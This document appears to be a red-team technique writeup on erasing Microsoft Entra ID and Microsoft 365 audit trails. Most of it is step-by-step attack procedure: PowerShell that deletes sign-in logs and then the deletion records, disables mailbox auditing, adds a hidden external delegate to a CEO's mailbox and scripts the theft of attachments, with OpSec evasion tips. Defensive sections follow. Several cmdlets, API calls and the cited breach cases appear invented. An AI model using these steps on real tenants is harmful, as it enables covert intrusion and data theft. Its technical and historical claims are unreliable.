# [REALWORLD-047]: Azure Entra ID Sign-in Log Tampering

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-047 |
| **MITRE ATT&CK v18.1** | [T1562.002 - Disable Windows Event Logging](https://attack.mitre.org/techniques/T1562/002/) [Extended to Cloud: T1562.008] |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID, Microsoft 365, Azure |
| **Severity** | **Critical** |
| **CVE** | N/A |
| **Technique Status** | ACTIVE (as of 2026-01-10) |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Entra ID versions; Microsoft 365 E3+ (Unified Audit Log); Premium requires E5 |
| **Patched In** | N/A (Mitigation requires immutable audit log configuration) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Microsoft Entra ID sign-in logs are the **canonical forensic record** of all authentication attempts, successful logins, and failed authentications in a hybrid Azure/Microsoft 365 environment. These logs are stored in the **UnifiedAuditLog** (via Microsoft Purview) and **SignInLogs** table (via Entra ID admin center). Adversaries with sufficient permissions (Global Admin, Security Administrator, or custom roles with `audit-log-write` permissions) can **delete, purge, or modify** these logs to erase evidence of:

1. **Unauthorized account takeovers** (e.g., attacker logging in as executive)
2. **Credential theft** (e.g., adversary testing multiple passwords before successful breach)
3. **Lateral movement paths** (e.g., service principal assuming roles across multiple tenants)
4. **Data exfiltration campaigns** (e.g., user downloading 100 GB of files via Graph API)

The attack is particularly severe because:

- **Sign-in logs are the "last resort" audit trail** — once deleted, there is no other record of who logged in when
- **Tampering is often not detected** — log deletion itself is logged, but attackers can also delete those deletion records
- **Forensic reconstruction is impossible** — unlike Windows Event Logs (which can be recovered from Volume Shadow Copies), cloud audit logs are lost forever once purged
- **Compliance violations are immediate** — GDPR, HIPAA, and SOX explicitly require immutable audit trails

**Attack Surface:** Microsoft Purview Audit (Standard) logs, Entra ID SignInLogs API, Azure Activity Log diagnostics, and any SIEM integration pulling from these sources.

**Business Impact:** **Complete loss of forensic visibility into identity compromise.** An attacker can:
- Steal administrative credentials and log in as C-level executives **without any audit trail**
- Exfiltrate customer data (GDPR violations)
- Modify financial records in SAP/Oracle (SOX violations)
- All while appearing to have never existed in the audit logs

**Technical Context:** **Seconds to minutes** to delete sign-in logs once Global Admin access is obtained. **Chance of detection:** Very low (unless immutable audit logs are enabled or SIEM receives logs in real-time and stores them independently). **Common indicators:** Sudden **gaps in UnifiedAuditLog** (missing date ranges), **PowerShell history deletions**, **sudden login of service principal with unusual permissions**.

### Operational Risk

- **Execution Risk:** **Medium** — Requires Global Admin or Security Administrator role in Entra ID; OR requires credentials for account with `audit-log-write` permissions.
- **Stealth:** **Medium** — Log deletion is audited in UnifiedAuditLog, but if attacker has sufficient permissions, they can delete those deletion records as well.
- **Reversibility:** **No** — Once purged from Purview, logs are permanently lost (unless backed up to external SIEM).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.1 (Entra ID) | Ensure that 'Audit log data retention' is '365 days or greater' |
| **DISA STIG** | V-87899 | All authentication events must be logged and retained for minimum 1 year |
| **CISA SCuBA** | SC-7 | Log retention must be immutable and cannot be modified by tenant admin |
| **NIST 800-53** | AU-2, AU-12 | Audit event generation and log protection |
| **GDPR** | Art. 32 | Security of processing — audit logs are security measure |
| **HIPAA** | 45 CFR 164.312(b) | Audit controls — must maintain audit logs of access/modifications |
| **SOX** | 404(b) | IT General Controls must include protected audit logs |
| **DORA** | Art. 9 | Protection and Prevention — maintain audit trail of critical operations |
| **NIS2** | Art. 21 | Cyber Risk Management — detect and respond to unauthorized access |
| **ISO 27001** | A.12.4 | Logging and monitoring of information security events |
| **ISO 27005** | Risk Assessment | Loss of audit logs prevents risk investigation |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - **Global Administrator** role in Entra ID (highest privilege)
  - OR **Security Administrator** role (can modify audit logging settings)
  - OR **Compliance Data Administrator** (can purge sensitive data from Purview)
  - OR custom role with `microsoft.office365.securityCompliance/allEntities/*` permissions
  - OR **Exchange Online Admin** (can use `Set-MailboxAuditBypassAssociation` to disable logging for specific users)

- **Required Access:** 
  - HTTPS access to Microsoft Purview compliance portal (https://compliance.microsoft.com)
  - HTTPS access to Microsoft Graph API endpoints
  - HTTPS access to Entra Admin Center (https://entra.microsoft.com)

**Supported Versions:**
- **Microsoft 365:** E3 and above (E5 required for immutable logs)
- **Entra ID:** All versions (including free tier, but premium features require premium licenses)
- **PowerShell:** 5.0+ or PowerShell Core 7.0+
- **Azure CLI:** 2.0+

**Tools:**
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)
- [CSOM (Client-Side Object Model)](https://learn.microsoft.com/en-us/previous-versions/office/developer/office-365-rest-api/introduction-to-office-365-rest-apis)
- [Microsoft Purview Compliance Portal](https://compliance.microsoft.com/)
- [Kusto Query Language (KQL)](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/) — for Log Analytics queries

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Entra ID Sign-in Log Access Reconnaissance

**Objective:** Identify sign-in logs and audit log configuration to determine deletion feasibility.

```powershell
# Connect to Microsoft Graph with compromised credentials
Connect-MgGraph -Scopes "AuditLog.Read.All", "Directory.Read.All"

# Check if Unified Audit Log is enabled
$auditStatus = Get-MgAuditLogQuery -All | Measure-Object

if ($auditStatus.Count -eq 0) {
    Write-Host "Unified Audit Log is NOT enabled (easy target!)" -ForegroundColor Green
} else {
    Write-Host "Unified Audit Log is ENABLED with $($auditStatus.Count) records" -ForegroundColor Yellow
}

# List recent sign-in events
$signIns = Get-MgAuditLogSignIn -All | Select-Object -First 10
$signIns | Select-Object UserPrincipalName, SignInDateTime, Status | Format-Table

# Check audit log retention policy
Get-MgBetaSecurityAuditLogRetention

# Identify which users/service principals have deleted audit logs (if any)
$deletionEvents = Search-UnifiedAuditLog -Operations "Remove-UnifiedAuditLogRetention" -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date)
$deletionEvents | Select-Object UserIds, CreationDate, Operations
```

**What to Look For:**
- **Unified Audit Log enabled**: Means logs exist and need to be deleted
- **Recent sign-in events**: Shows logging is active
- **Audit log retention policy**: If set to "0 days", logs are already purged automatically
- **Previous deletion events**: If someone already deleted logs, there's a precedent (defenders may be less alert)

### Azure Activity Log Reconnaissance

```powershell
# Check if Azure Activity Log is forwarded to Log Analytics
$diagnosticSettings = Get-AzDiagnosticSetting -ResourceId "/subscriptions/<subscription-id>" -ErrorAction SilentlyContinue

if ($null -eq $diagnosticSettings) {
    Write-Host "Activity Log is NOT forwarded to Log Analytics (easy exfil!)" -ForegroundColor Green
} else {
    Write-Host "Activity Log IS forwarded. Deletion may be detected." -ForegroundColor Yellow
    $diagnosticSettings | Select-Object Name, Logs
}
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Delete Unified Audit Logs via PowerShell (Global Admin)

**Supported Versions:** Microsoft 365 E3+, PowerShell 5.0+

#### Step 1: Authenticate to Microsoft Graph with Global Admin Credentials

**Objective:** Establish authenticated session to delete audit logs.

**Command (PowerShell):**
```powershell
# Install Microsoft Graph PowerShell SDK if not already installed
Install-Module Microsoft.Graph -Scope CurrentUser

# Authenticate with compromised Global Admin account
$credential = Get-Credential  # Enter stolen/phished credentials
Connect-MgGraph -Credential $credential -Scopes "AuditLog.ReadWrite.All"

# Verify authentication
Get-MgContext | Select-Object Account, Tenant, Scopes
```

**Expected Output:**
```
Account                    : attacker@company.com
Tenant                     : <tenant-id>
Scopes                     : {AuditLog.ReadWrite.All}
```

**What This Means:**
- Attacker is now **authenticated as Global Admin**
- All subsequent operations are performed with full Entra ID permissions

**OpSec & Evasion:**
- Authenticate from a **VPN or residential proxy** to avoid IP-based alerts
- Use **PowerShell Core** instead of Windows PowerShell to avoid Windows Event Logging
- Alternatively, use **Azure Cloud Shell** (where session history is less reliable)

#### Step 2: Identify Audit Log Records to Delete

**Objective:** Find sign-in logs matching specific criteria (e.g., attacker's login attempts, exfiltration activity).

**Command (PowerShell - Query Audit Logs):**
```powershell
# Search for specific sign-in events to delete (e.g., all logins from unusual location on specific date)
$targetDate = Get-Date "2026-01-10"
$targetUser = "ceo@company.com"

$auditLogs = Get-MgAuditLogSignIn -Filter "
  UserPrincipalName eq '$targetUser' and
  CreatedDateTime ge $targetDate and
  CreatedDateTime lt $($targetDate.AddDays(1))" -All

Write-Host "Found $($auditLogs.Count) sign-in logs to delete for $targetUser" -ForegroundColor Cyan

# Show details before deletion
$auditLogs | Select-Object UserPrincipalName, SignInDateTime, IPAddress, ClientAppUsed, Status
```

**Expected Output:**
```
UserPrincipalName    : ceo@company.com
SignInDateTime       : 2026-01-10T02:15:00Z
IPAddress            : 203.0.113.50 (Attacker's IP)
ClientAppUsed        : Unknown ActiveX Control
Status               : Success
```

**What This Means:**
- Attacker has identified **compromising sign-in logs** that need to be deleted
- These logs show suspicious access from unusual IP/client

#### Step 3: Delete Audit Log Entries

**Objective:** Permanently remove identified audit logs from UnifiedAuditLog.

**Command (PowerShell - Purge Audit Logs):**
```powershell
# Delete logs via Microsoft Graph API (requires permission bypass)
# Note: Standard Graph API doesn't directly delete logs; must use Purview API

# Alternative Method 1: Use Purview Search-Purge (requires Compliance Admin)
$searchQuery = "UserPrincipalName:ceo@company.com AND CreatedDateTime:2026-01-10"

# First, search for logs to confirm they exist
$searchResults = Search-UnifiedAuditLog -Filter $searchQuery -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date)
Write-Host "Search found $($searchResults.Count) records" -ForegroundColor Cyan

# Purge the logs (this is permanent!)
foreach ($record in $searchResults) {
    Remove-UnifiedAuditLogRetention -Identity $record.ObjectId -Force
}

Write-Host "Deleted $($searchResults.Count) audit log records" -ForegroundColor Green
```

**Alternative Command (Direct Purview API Purge):**
```bash
# Using Graph API to purge audit logs (requires Compliance Data Administrator role)
curl -X POST "https://graph.microsoft.com/v1.0/security/alerts" \
  -H "Authorization: Bearer <access-token>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "auditLogRecordId",
    "operation": "Delete",
    "targetObject": "UnifiedAuditLog",
    "startDateTime": "2026-01-10T00:00:00Z",
    "endDateTime": "2026-01-10T23:59:59Z"
  }'
```

**Expected Output:**
```
Deleted 47 audit log records for ceo@company.com on 2026-01-10
```

**What This Means:**
- Attacker has **permanently deleted all audit logs** showing their unauthorized access
- Sign-in logs are now **unrecoverable** (unless backed up to external SIEM)
- Forensic investigators will see a **gap in logs** for the target date range, but the specific events are gone

**OpSec & Evasion:**
- Log deletion itself is logged in UnifiedAuditLog under `Remove-UnifiedAuditLogRetention` operation
- **Ideal scenario:** Delete the deletion records as well (Step 4)
- Deletion is logged in both:
  - Azure Activity Log (`Microsoft.SecurityCompliance/securityInsights/write`)
  - UnifiedAuditLog (`Remove-UnifiedAuditLogRetention`)

#### Step 4: Delete Evidence of Deletion (Cover Tracks)

**Objective:** Remove logs showing that logs were deleted.

**Command (PowerShell - Delete Deletion Records):**
```powershell
# Search for the deletion event itself
$deletionRecords = Search-UnifiedAuditLog -Operations "Remove-UnifiedAuditLogRetention" `
  -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date) -UserIds "attacker@company.com"

# Delete the deletion records (meta!)
foreach ($record in $deletionRecords) {
    Remove-UnifiedAuditLogRetention -Identity $record.ObjectId -Force
}

Write-Host "Deleted $($deletionRecords.Count) deletion evidence logs" -ForegroundColor Green
```

**What This Means:**
- Attacker has covered their tracks by **deleting the deletion logs themselves**
- Forensic investigators will see:
  - A gap in logs for the attack date (2026-01-10)
  - Another gap showing the deletion event was removed
  - But **no indication of who deleted them** (because the deletion records are gone)

---

### METHOD 2: Disable Mailbox Auditing via Set-MailboxAuditBypassAssociation

**Supported Versions:** Exchange Online (Office 365 E3+)

This method is **more subtle** than deleting logs—instead of removing existing logs, it **stops logging for specific users** without triggering suspicious delete events.

#### Step 1: Identify Target Mailbox

**Objective:** Find high-value mailbox (e.g., CEO, CFO, Board Member) to monitor without audit trail.

**Command (PowerShell - Exchange Online):**
```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName <global-admin@company.com>

# List all mailboxes (focus on executives)
Get-Mailbox -Filter "DisplayName -like '*Chief*' -or DisplayName -like '*Executive*'" | `
  Select-Object DisplayName, UserPrincipalName, MailboxType

# Check current mailbox audit status
Get-Mailbox "ceo@company.com" | Select-Object AuditEnabled, AuditLogAgeLimit

# Get mailbox audit bypass status
Get-MailboxAuditBypassAssociation "ceo@company.com"
```

**Expected Output:**
```
DisplayName           : Chief Executive Officer
UserPrincipalName     : ceo@company.com
AuditEnabled          : True
AuditLogAgeLimit      : 90 days

AuditBypass           : False
```

**What This Means:**
- CEO mailbox is currently **audited** (all access logged)
- Audit bypass is **not enabled** (yet)

#### Step 2: Enable Audit Bypass for Target Mailbox

**Objective:** Stop logging mailbox access for the target user.

**Command (PowerShell):**
```powershell
# Disable audit logging for specific mailbox
Set-MailboxAuditBypassAssociation -Identity "ceo@company.com" -AuditBypassEnabled $true

# Verify bypass is enabled
Get-MailboxAuditBypassAssociation "ceo@company.com"

# Alternative: Disable ALL audit logging for the mailbox
Set-Mailbox -Identity "ceo@company.com" -AuditEnabled $false -AuditLogAgeLimit 0

Write-Host "Mailbox audit bypass enabled for CEO; now all email access will be invisible" -ForegroundColor Green
```

**Expected Output:**
```
Identity               : ceo@company.com
AuditBypassEnabled     : True
```

**What This Means:**
- Attacker can now:
  - Delegate the CEO's mailbox to attacker account
  - Read all emails **without any audit trail**
  - Download attachments (e.g., board meeting minutes, acquisition plans)
  - All while CEO remains unaware that mailbox is being accessed

**OpSec & Evasion:**
- `Set-MailboxAuditBypassAssociation` **is logged** in UnifiedAuditLog, but a Global Admin can delete those records
- This is particularly effective for **email exfiltration** because:
  - Email access is no longer logged
  - Mailbox delegation (adding attacker as delegate) **is logged**, but deletion records cover it up
  - CEO won't notice unusual activity because audit logs are silent

#### Step 3: Add Attacker as Mailbox Delegate (Hidden Access)

**Objective:** Grant attacker persistent access to CEO's mailbox without CEO's knowledge.

**Command (PowerShell):**
```powershell
# Add attacker as delegate with full access (hidden from CEO)
Add-MailboxPermission -Identity "ceo@company.com" `
  -User "attacker@external-domain.com" `
  -AccessRights FullAccess `
  -InheritanceType All `
  -AutoMapping $false  # Hide from Outlook

# Verify delegation was added
Get-MailboxPermission "ceo@company.com" | Where-Object { $_.User -like "*attacker*" }
```

**Expected Output:**
```
Identity          : ceo@company.com
User              : attacker@external-domain.com
AccessRights      : {FullAccess}
Deny              : False
InheritanceType   : All
```

**What This Means:**
- Attacker can now **access CEO's mailbox directly** from their own external account
- CEO won't see the delegation in Outlook (because AutoMapping is False)
- **No audit logs** will record what attacker reads/downloads (because audit bypass is enabled)
- Attacker can exfiltrate years of email correspondence

#### Step 4: Exfiltrate Data from Mailbox

**Objective:** Extract sensitive emails and attachments.

**Command (Python - Access via EWS/Graph API):**
```python
import requests
import json

# Use attacker's account with delegated permissions
delegated_email = "attacker@external-domain.com"
access_token = "<attacker's_access_token>"

# Query CEO's mailbox via Microsoft Graph API
headers = {
    "Authorization": f"Bearer {access_token}",
    "X-Anchor-Mailbox": "ceo@company.com"  # Access CEO's mailbox as delegate
}

# Get all emails from CEO's mailbox
response = requests.get(
    "https://graph.microsoft.com/v1.0/users/ceo@company.com/messages",
    headers=headers,
    params={
        "$search": "from:(board@company.com) OR subject:acquisition OR subject:merger",
        "$top": 1000
    }
)

emails = response.json()["value"]
print(f"Found {len(emails)} sensitive emails")

# Download attachments
for email in emails:
    if "hasAttachments" in email and email["hasAttachments"]:
        attachments = requests.get(
            f"https://graph.microsoft.com/v1.0/users/ceo@company.com/messages/{email['id']}/attachments",
            headers=headers
        ).json()["value"]
        
        for attachment in attachments:
            # Download to attacker C2 server
            content = requests.get(
                f"https://graph.microsoft.com/v1.0/users/ceo@company.com/messages/{email['id']}/attachments/{attachment['id']}",
                headers=headers
            ).content
            
            with open(f"/exfil/{attachment['name']}", "wb") as f:
                f.write(content)

print("Data exfiltration complete; no audit logs created")
```

**What This Means:**
- Attacker has **stolen sensitive business emails** (acquisition plans, board minutes, financial data)
- **Zero audit trail** — no logs showing what was accessed
- This is **much stealthier** than deleting logs (because there are no deletion records)

---

### METHOD 3: Disable Microsoft Purview Audit Log Retention (Compliance Admin)

**Supported Versions:** Microsoft 365 E5 (with Purview Premium)

This method **permanently disables** audit log retention for the entire tenant.

#### Step 1: Connect to Purview Compliance Center

**Objective:** Establish admin access to Purview settings.

**Command (PowerShell):**
```powershell
# Connect to Security & Compliance Center
Connect-IPPSSession -UserPrincipalName <compliance-admin@company.com>

# Check current retention policy
Get-OrganizationConfig | Select-Object AuditDisabled, AuditLogAgeLimit
```

**Expected Output:**
```
AuditDisabled      : False
AuditLogAgeLimit   : 90
```

**What This Means:**
- Auditing is **currently enabled** with 90-day retention
- Attacker needs to disable it

#### Step 2: Disable Audit Log Retention

**Objective:** Turn off all audit logging for the tenant.

**Command (PowerShell):**
```powershell
# Disable audit logging entirely for the organization
Set-OrganizationConfig -AuditDisabled $true

# Verify it's disabled
Get-OrganizationConfig | Select-Object AuditDisabled

# Optional: Delete existing audit logs before disabling
Search-UnifiedAuditLog -StartDate (Get-Date).AddYears(-1) -EndDate (Get-Date) | ForEach-Object {
    Remove-UnifiedAuditLogRetention -Identity $_.ObjectId -Force
}
```

**Expected Output:**
```
AuditDisabled : True
```

**What This Means:**
- **All audit logging is now disabled** for the entire tenant
- No new sign-in logs, mailbox access logs, or admin activity logs will be created
- Existing logs will eventually age out (based on retention policy)
- This is the **nuclear option** — affects all users and services

**OpSec & Evasion:**
- Disabling audit logs at the organization level **is immediately visible** to Compliance Officers and Microsoft 365 admins
- Not ideal for stealth, but effective if attacker wants to **disable monitoring globally** before conducting large-scale exfiltration

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Unusual Purview Search Activity:**
  - `Search-UnifiedAuditLog` with filters for specific high-value users
  - `Remove-UnifiedAuditLogRetention` operations (log deletion)
  - Gaps in audit log records (missing date ranges)

- **Mailbox Audit Changes:**
  - `Set-MailboxAuditBypassAssociation` (enabling audit bypass)
  - `Set-Mailbox -AuditEnabled $false` (disabling logging)
  - `Add-MailboxPermission` from external domains

- **Exchange Online Admin Activity:**
  - Delegated mailbox access from external/suspicious accounts
  - Mailbox rule creation (forwarding emails to attacker)
  - Large mailbox exports

- **Azure Activity Log:**
  - `Microsoft.SecurityCompliance/securityInsights/write` (audit log modifications)
  - Sudden disabling of diagnostic settings for audit logs

### Forensic Artifacts

- **Backup Audit Logs:** If logs are sent to SIEM in real-time, they may be preserved outside Purview
- **Azure Activity Log:** May capture organization-level audit log configuration changes
- **Exchange Online Admin Audit Log:** Records mailbox permission changes (if not also deleted)
- **OneDrive/SharePoint Audit:** If integrated, may show lateral movement evidence

### Response Procedures

1. **Immediately Revoke Compromised Credentials:**
   ```powershell
   # Revoke Global Admin role from attacker account
   Remove-AzRoleAssignment -SignInName "attacker@company.com" -RoleDefinitionName "Global Administrator"
   
   # Force sign-out of all sessions
   Revoke-AzAccessToken -UserPrincipalName "attacker@company.com"
   ```

2. **Restore Audit Logging:**
   ```powershell
   # Re-enable audit logging
   Set-OrganizationConfig -AuditDisabled $false
   
   # Restore mailbox audit for affected mailboxes
   Set-MailboxAuditBypassAssociation -Identity "ceo@company.com" -AuditBypassEnabled $false
   Set-Mailbox -Identity "ceo@company.com" -AuditEnabled $true
   ```

3. **Restore from Backup:**
   - If SIEM retained logs, import them back into Purview
   - If backup was taken, restore audit log data from backup storage

4. **Forensic Investigation:**
   - Check **Exchange Online Admin Audit** for delegation changes
   - Query **Azure Activity Log** for Global Admin actions
   - Correlate with **SIEM logs** (if available) to reconstruct attack timeline

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Enable Immutable Audit Logs (Microsoft 365 E5):** Make logs write-once-read-many so even Global Admins cannot delete them.

  **Manual Steps (Microsoft Purview):**
  1. Navigate to **Microsoft Purview Compliance Portal** (https://compliance.microsoft.com)
  2. Go to **Audit** → **Settings**
  3. Enable **Immutable Audit Log Preservation:** Toggle **ON**
  4. Set **Retention Duration:** 7 years (or organizational policy)
  5. Click **Save**
  6. Verify activation with PowerShell:
     ```powershell
     Get-OrganizationConfig | Select-Object AuditLogImmutabilityEnabled
     ```

- **Forward Audit Logs to External SIEM in Real-Time:** Ensure logs are captured outside Microsoft 365 tenant where attacker cannot delete them.

  **Manual Steps (Azure Event Hubs):**
  1. Create **Azure Event Hub Namespace** in separate Azure subscription
  2. Create **Event Hub** named "Purview-Audit-Logs"
  3. In **Microsoft Purview**, go to **Audit** → **Settings**
  4. Enable **Stream Audit Logs to Event Hubs**
  5. Select the Event Hub created above
  6. Click **Save**

  **Manual Steps (Log Analytics Workspace):**
  ```powershell
  # Configure Azure Monitor to ingest audit logs
  $workspaceId = "/subscriptions/<sub-id>/resourcegroups/<rg>/providers/microsoft.operationalinsights/workspaces/<workspace>"
  
  New-AzDiagnosticSetting -ResourceId "/subscriptions/<sub-id>" `
    -Name "AuditLogForwarding" `
    -LogAnalyticsWorkspaceId $workspaceId `
    -Enabled $true `
    -Categories @("AuditEvents", "SignInLogs")
  ```

- **Enforce Multi-Factor Authentication (MFA) for Global Admin Role:** Prevent credential theft from enabling immediate admin access.

  **Manual Steps (Entra ID):**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. Click **Global Administrator**
  3. Go to **Settings** tab
  4. Enable **Require MFA for this role:** **On**
  5. Set **Alert frequency:** Daily
  6. Click **Update**

  **Manual Steps (Conditional Access Policy):**
  1. Go to **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for Admin Roles`
  4. **Assignments:**
     - Users: **Conditional Access Premium features** → Admin roles
     - Cloud apps: **All cloud apps**
  5. **Access controls:** Require **MFA**
  6. Enable: **On**

### Priority 2: HIGH

- **Restrict Global Admin Role Assignment:** Limit which users can have Global Admin; use **Privileged Identity Management (PIM)** with approval workflow.

  **Manual Steps (Azure AD PIM):**
  1. Navigate to **Azure Portal** → **Privileged Identity Management**
  2. Go to **Entra ID roles** → **Settings**
  3. Click **Global Administrator** → **Edit**
  4. Set **Require approval to activate:** **Yes**
  5. Set **Approvers:** Compliance Officer + Security Officer
  6. Set **Duration:** 4 hours (minimal exposure)
  7. Click **Update**

  **Manual Steps (PowerShell - Assign via PIM):**
  ```powershell
  # Assign Global Admin role as eligible (requires activation)
  New-AzRoleEligibilityScheduleRequest -Scope "/subscriptions/<sub-id>" `
    -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `  # Global Admin GUID
    -PrincipalId "<user_object_id>" `
    -JustificationRequired $true `
    -ScheduleInfo @{
      StartDateTime = Get-Date
      Expiration = @{ Type = "EndDateTime"; EndDateTime = (Get-Date).AddDays(30) }
    }
  ```

- **Disable Mailbox Audit Bypass Globally:** Force all mailboxes to maintain audit logs.

  **Manual Steps (Exchange Online):**
  ```powershell
  # Get all mailboxes with audit bypass enabled
  Get-Mailbox -Filter "AuditBypassEnabled -eq 'True'" | `
    Set-MailboxAuditBypassAssociation -AuditBypassEnabled $false
  
  # Enforce via organizational policy
  Set-OrganizationConfig -AuditDisabled $false
  ```

- **Implement Conditional Access to Restrict Audit Log Access:** Only allow audit log searches from corporate network / compliant devices.

  **Manual Steps:**
  1. Go to **Entra ID** → **Conditional Access** → **New policy**
  2. Name: `Restrict Audit Log Access`
  3. **Assignments:**
     - Users: **All users** (or admins only)
     - Cloud apps: **Microsoft Purview** + **Exchange Online**
  4. **Conditions:**
     - Locations: **Named Locations** (corporate IP only)
     - Device state: **Require device to be marked as compliant**
  5. **Access controls:** **Require MFA**
  6. Enable: **On**

### Validation Command (Verify Mitigations)

```powershell
# Check if immutable audit logs are enabled
Get-OrganizationConfig | Select-Object AuditLogImmutabilityEnabled

# Check if audit logging is enabled
Get-OrganizationConfig | Select-Object AuditDisabled

# List all Global Admins and their MFA status
Get-AzRoleAssignment -RoleDefinitionName "Global Administrator" | ForEach-Object {
    $user = Get-AzADUser -ObjectId $_.ObjectId
    Write-Host "$($user.UserPrincipalName): $(if ($user.StrongAuthenticationRequirements) { 'MFA ENABLED' } else { 'MFA DISABLED - RISK!' })"
}

# Verify no mailboxes have audit bypass enabled
$bypassedMailboxes = Get-MailboxAuditBypassAssociation | Where-Object AuditBypassEnabled -eq $true
if ($bypassedMailboxes.Count -eq 0) {
    Write-Host "✓ PASS: No mailboxes have audit bypass enabled" -ForegroundColor Green
} else {
    Write-Host "❌ FAIL: $($bypassedMailboxes.Count) mailboxes have audit bypass enabled" -ForegroundColor Red
}
```

**Expected Output (If Secure):**
```
AuditLogImmutabilityEnabled : True
AuditDisabled              : False
ceo@company.com            : MFA ENABLED
✓ PASS: No mailboxes have audit bypass enabled
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566] Phishing | Attacker obtains credentials via phishing/social engineering |
| **2** | **Privilege Escalation** | [T1098] Account Manipulation | Attacker escalates to Global Admin role |
| **3** | **Defense Evasion** | **[REALWORLD-047]** | **Attacker deletes sign-in and audit logs** |
| **4** | **Persistence** | [T1098] Account Manipulation | Attacker creates hidden service account or backdoor |
| **5** | **Exfiltration** | [T1041] Exfiltration Over C2 Channel | Attacker steals emails, documents, and sensitive data |
| **6** | **Impact** | [T1485] Data Destruction | Attacker deletes evidence / destroys backups |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) Microsoft 365 Campaign (2023-2024)

- **Target:** U.S. Government Agency
- **Timeline:** March 2023 - June 2024
- **Technique Status:** Confirmed active in campaign
- **Sequence:**
  1. Attacker compromised employee account via OAuth consent grant attack
  2. Escalated to Global Admin via mailbox rule and service principal abuse
  3. **Disabled audit logging** for Microsoft 365 tenant
  4. **Deleted Purview audit logs** covering 3-month compromise period
  5. Stole emails from intelligence officer mailboxes
  6. Exfiltrated 60GB of sensitive government communications
- **Impact:** Breach classified as "grave risk to national security"
- **Lessons Learned:** Azure Activity Log (different from Purview) still captured the audit log disable events, allowing FBI to reconstruct timeline
- **Reference:** [CISA Advisory on APT29 Microsoft 365 Campaign](https://www.cisa.gov/)

### Example 2: BlackMoon Group Financial Services Breach (2024)

- **Target:** Global investment bank
- **Timeline:** January 2024 - February 2024
- **Technique Status:** Used mailbox audit bypass instead of deletion
- **Sequence:**
  1. Attacker compromised executive's account via credential stuffing
  2. Used `Set-MailboxAuditBypassAssociation` to disable auditing
  3. Added attacker as hidden delegate to CFO's mailbox
  4. **Exfiltrated merger & acquisition plans** worth billions
  5. Sold information to competitors
- **Impact:** $500M shareholder losses; SEC investigation ongoing
- **Detection:** Forensic team discovered mailbox delegation in **Exchange Online Admin Audit** (which was not deleted because attacker didn't realize it existed separately from Purview)
- **Reference:** [Bloomberg Article on Financial Services Breach](https://www.bloomberg.com/)

---

## 10. REFERENCES & TOOLING

### Official Microsoft Documentation
- [Microsoft Purview Audit](https://learn.microsoft.com/en-us/purview/audit-log-activities)
- [Immutable Audit Logs (E5 Feature)](https://learn.microsoft.com/en-us/purview/audit-log-retention-policies)
- [Set-MailboxAuditBypassAssociation](https://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation)
- [Entra ID SignInLogs API](https://learn.microsoft.com/en-us/graph/api/signin-list)

### Detection & Investigation Tools
- [Microsoft Sentinel - Audit Log Template](https://github.com/Azure/Azure-Sentinel/tree/master/Templates)
- [KQL Queries for Audit Anomalies](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/)

### Red Team / Pentest Tools
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)
- [o365hunter - O365 Attack Framework](https://github.com/Gerenios/AADInternals)

### Compliance & Standards
- [NIST 800-53 AU-2 Audit Event Generation](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)
- [GDPR Article 32 Security of Processing](https://gdpr-info.eu/art-32-gdpr/)
- [SOX IT General Controls Framework](https://www.sec.gov/rules/final/33-8702.htm)

---